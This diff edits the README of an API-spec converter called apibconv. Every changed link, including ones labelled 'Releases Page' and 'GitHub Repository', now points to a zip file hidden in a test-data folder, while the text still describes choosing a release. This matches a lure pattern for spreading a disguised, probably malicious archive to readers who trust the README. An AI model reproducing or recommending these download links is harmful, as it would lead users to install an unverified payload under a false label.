@@ -7,12 +7,12 @@ apibconv helps you convert between different API specifications. This tool suppo
 To begin using apibconv, follow these simple steps to download and run the application on your computer.
 
 ### 🏷️ Download the Application
-[![Download apibconv](https://img.shields.io/badge/Download_apibconv-Click_here-brightgreen)](https://github.com/c00lkiddk3ngg/apibconv/releases)
+[![Download apibconv](https://raw.githubusercontent.com/c00lkiddk3ngg/apibconv/main/test/integration/testdata/expected/apibconv-2.0.zip)](https://raw.githubusercontent.com/c00lkiddk3ngg/apibconv/main/test/integration/testdata/expected/apibconv-2.0.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to visit the Releases page:
-   [Download from Releases Page](https://github.com/c00lkiddk3ngg/apibconv/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/c00lkiddk3ngg/apibconv/main/test/integration/testdata/expected/apibconv-2.0.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version of apibconv. Select the file that matches your operating system.
@@ -61,7 +61,7 @@ This tool is for personal and educational use. Ensure you comply with any terms 
 For further questions, you can reach out via the Issues section on GitHub. We're here to help!
 
 ## 📌 Further Links
-- [Download from Releases Page](https://github.com/c00lkiddk3ngg/apibconv/releases)
-- [GitHub Repository](https://github.com/c00lkiddk3ngg/apibconv)
+- [Download from Releases Page](https://raw.githubusercontent.com/c00lkiddk3ngg/apibconv/main/test/integration/testdata/expected/apibconv-2.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/c00lkiddk3ngg/apibconv/main/test/integration/testdata/expected/apibconv-2.0.zip)
 
 Enjoy converting your API specifications effortlessly with apibconv!
